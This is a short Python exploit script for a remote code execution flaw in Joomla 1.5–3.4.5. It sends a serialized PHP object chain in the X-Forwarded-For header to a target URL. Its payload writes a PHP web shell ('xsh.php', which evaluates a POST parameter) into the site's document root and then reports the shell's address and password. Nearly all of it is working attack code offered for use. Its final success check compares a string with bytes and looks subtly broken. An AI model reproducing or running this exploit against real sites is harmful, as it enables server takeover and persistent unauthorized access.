# coding=utf-8
# Help: joomla 1.5-3.4.5 unserialize remote code execution

import urllib.request
from http import cookiejar
import sys

url ='http://192.168.255.151:8081/Joomla_3.4.5-Stable-Full_Package/'
cj = cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

urllib.request.install_opener(opener)
urllib.request.socket.setdefaulttimeout(10)

payload = 'file_put_contents($_SERVER["DOCUMENT_ROOT"].chr(47)."xsh.php","\x3C".chr(63)."@eval(\x5C\x24_POST[x]);")'
#payload='phpinfo();'

forward = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:' + str(
    len(
        payload) + 28) + ':"' + payload + ';JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
print (forward)  # 打印payload , \x5C0\x5C0\x5C0  需要 打印完变成\0\0\0 需要手动恢复
req = urllib.request.Request(url=url, headers={'x-forwarded-for': forward,'Accept':'*/*'})
res=opener.open(req)
req = urllib.request.Request(url=url)
resp=opener.open(req).read()
print(resp)
if 'SimplePie_Misc::parse_url' in resp:
    print('Shell: ' + url + '/xsh.php Password: x')
else:
    print('Unvunerable!')
